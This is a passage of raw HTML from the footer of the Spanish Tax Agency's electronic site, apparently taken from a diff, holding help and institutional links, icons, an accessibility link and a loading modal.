href="https://sede.agenciatributaria.gob.es/Sede/colaborar-agencia-tributaria/denuncias.html" target="_self" title="Denuncias">Denuncias</a></li><li class="position-relative mb-2"><a class="d-block text-white" href="https://sede.agenciatributaria.gob.es/Sede/informacion-institucional/suscripcion-rss-newsletter/newsletter.html" target="_self" title="Suscripción newsletter">Suscripción newsletter</a></li><li class="position-relative"><a class="d-block text-white" href="https://sede.agenciatributaria.gob.es/Sede/informacion-institucional/suscripcion-rss-newsletter/rss.html" target="_self" title="Suscripción RSS">Suscripción RSS</a></li></ul></div><div class="col-12 col-sm-6 col-lg-3"><h2 class="h4 mb-3 text-white js-aeat-footer-collapse-sm" id="tgraeat-id-1675798679918">Ayuda</h2><ul class="list-unstyled" id="aeat-id-1675798679918"><li class="position-relative mb-2"><a class="d-block text-white" href="https://sede.agenciatributaria.gob.es/Sede/search.html" target="_self" title="Buscar">Buscar</a></li><li class="position-relative mb-2"><a class="d-block text-white" href="https://sede.agenciatributaria.gob.es/Sede/ayuda/consultas-informaticas.html" target="_self" title="Consultas informáticas">Consultas informáticas</a></li><li class="position-relative mb-2"><a class="d-block text-white" href="https://sede.agenciatributaria.gob.es/Sede/ayuda/disenos-registro.html" target="_self" title="Diseños de registro">Diseños de registro</a></li><li class="position-relative mb-2"><a class="d-block text-white" href="https://sede.agenciatributaria.gob.es/Sede/ayuda/horario-interrupciones-sede-electronica.html" target="_self" title="Horario de interrupciones de sede">Horario de interrupciones de sede</a></li><li class="position-relative mb-2"><a class="d-block text-white" href="https://sede.agenciatributaria.gob.es/Sede/ayuda/manuales-videos-folletos.html" target="_self" title="Manuales, vídeos y folletos">Manuales, vídeos y folletos</a></li><li class="position-relative mb-2"><a class="d-block text-white" href="https://sede.agenciatributaria.gob.es/Sede/procedimientoini/ZZ08.shtml" target="_self" title="Simuladores">Simuladores</a></li><li class="position-relative"><a class="d-block text-white" href="https://sede.agenciatributaria.gob.es/Sede/ayuda.html" target="_self" title="Todas las ayudas">Todas las ayudas</a></li></ul></div><div class="col-12 col-sm-6 col-lg-3"><h2 class="h4 mb-3 text-white js-aeat-footer-collapse-sm" id="tgraeat-id-1675798679919">Enlaces de interés</h2><ul class="list-unstyled" id="aeat-id-1675798679919"><li class="position-relative mb-2"><a class="d-block text-white" href="https://www.hacienda.gob.es/" target="_blank" title="Ministerio de Hacienda y Función Pública, se abre en ventana nueva">Ministerio de Hacienda y Función Pública<title id="svg-inline--fa-title-BHaG9dxjyNkD">Se abre en ventana nueva</title><path d="M23.1,0V9.25H21.25V3.16l-8.6,8.6-1.3-1.31,8.59-8.6H13.85V0ZM17.55,20.36H2.75V5.55h7.4V3.7H.9V22.21H19.4V13H17.55Z" fill="currentColor"></path><!-- <i class="aeat-ico fa-ico-ventana-nueva-sm ico-size-1 ml-1" role="img" title="Se abre en ventana nueva"></i> --></a></li><li class="position-relative mb-2"><a class="d-block text-white" href="https://www.agenciatributaria.es/AEAT.fisterritorial/InicioF.shtml" target="_blank" title="Fiscalidad autonómica y local, se abre en ventana nueva">Fiscalidad autonómica y local<title id="svg-inline--fa-title-4sbOFJXAZPpx">Se abre en ventana nueva</title><path d="M23.1,0V9.25H21.25V3.16l-8.6,8.6-1.3-1.31,8.59-8.6H13.85V0ZM17.55,20.36H2.75V5.55h7.4V3.7H.9V22.21H19.4V13H17.55Z" fill="currentColor"></path><!-- <i class="aeat-ico fa-ico-ventana-nueva-sm ico-size-1 ml-1" role="img" title="Se abre en ventana nueva"></i> --></a></li><li class="position-relative mb-2"><a class="d-block text-white" href="https://www2.agenciatributaria.gob.es/static_files/common/dep/planificacion/CDC/IFRD0001.html" target="_self" title="Consejo para la Defensa del Contribuyente">Consejo para la Defensa del Contribuyente</a></li><li class="position-relative mb-2"><a class="d-block text-white" href="https://administracion.gob.es/" target="_blank" title="Punto de Acceso General, se abre en ventana nueva">Punto de Acceso General<title id="svg-inline--fa-title-t3OJONnGCFc7">Se abre en ventana nueva</title><path d="M23.1,0V9.25H21.25V3.16l-8.6,8.6-1.3-1.31,8.59-8.6H13.85V0ZM17.55,20.36H2.75V5.55h7.4V3.7H.9V22.21H19.4V13H17.55Z" fill="currentColor"></path><!-- <i class="aeat-ico fa-ico-ventana-nueva-sm ico-size-1 ml-1" role="img" title="Se abre en ventana nueva"></i> --></a></li><li class="position-relative mb-2"><a class="d-block text-white" href="https://transparencia.gob.es" target="_blank" title="Portal de la transparencia, se abre en ventana nueva">Portal de la transparencia<title id="svg-inline--fa-title-T8RAC41EOKWd">Se abre en ventana nueva</title><path d="M23.1,0V9.25H21.25V3.16l-8.6,8.6-1.3-1.31,8.59-8.6H13.85V0ZM17.55,20.36H2.75V5.55h7.4V3.7H.9V22.21H19.4V13H17.55Z" fill="currentColor"></path><!-- <i class="aeat-ico fa-ico-ventana-nueva-sm ico-size-1 ml-1" role="img" title="Se abre en ventana nueva"></i> --></a></li><li class="position-relative"><a class="d-block text-white" href="https://sede.agenciatributaria.gob.es/Sede/enlaces-interes.html" target="_self" title="Otros enlaces de interés">Otros enlaces de interés</a></li></ul></div></div></div>
+
+<div class="container py-3">
+<div class="row">
+<a class="text-white" data-aeat-id="dade509ed8ff5710VgnVCM100000dc381e0aRCRD" href="https://sede.agenciatributaria.gob.es/Sede/condiciones-uso-sede-electronica/accesibilidad/declaracion-accesibilidad.html">Accesibilidad
+    </a>
+</div>
+</div>
+
+<div aria-hidden="true" aria-label="mensaje procesando" class="modal fade d-print-none" id="processingModal" role="dialog" tabindex="-1"><div class="modal-dialog modal-sm" role="document"><div class="modal-content"><div class="modal-body"><div class="d-flex align-item-center"><strong>Procesando...</strong><div class="spinner-border text-primary ml-auto bloque_der"></div></div></div></div></div></div></footer>
+<div class="d-none">
+<span class="js-responsive d-xs-block"></span>
+<span class="js-responsive d-sm-block"></span>
+<span class="js-responsive d-md-block"></span>
+<span class="js-responsive d-lg-block"></span>
+<span class="js-responsive d-xl-block"></span>
+<span class="js-responsive d-xxl-block"></span>
+<span class="js-responsive d-xxxl-block"></span>
+</div>
+</body></html>
